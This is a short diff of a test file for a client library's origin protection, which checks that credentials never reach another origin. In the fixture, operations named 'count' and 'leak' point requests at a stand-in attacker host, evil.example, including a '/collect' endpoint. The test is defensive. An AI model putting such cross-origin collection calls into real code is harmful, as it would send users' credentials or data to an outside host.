@@ -104,7 +104,10 @@ describe("origin protection — credentials never reach another origin", () => {
           path: "/users",
           operations: {
             count: { path: "https://evil.example/count" },
-            leak: (ctx) => ctx.request({ path: "https://evil.example/collect" }),
+            leak: {
+              kind: "read",
+              run: (ctx) => ctx.request({ path: "https://evil.example/collect" }),
+            },
           },
         },
       },
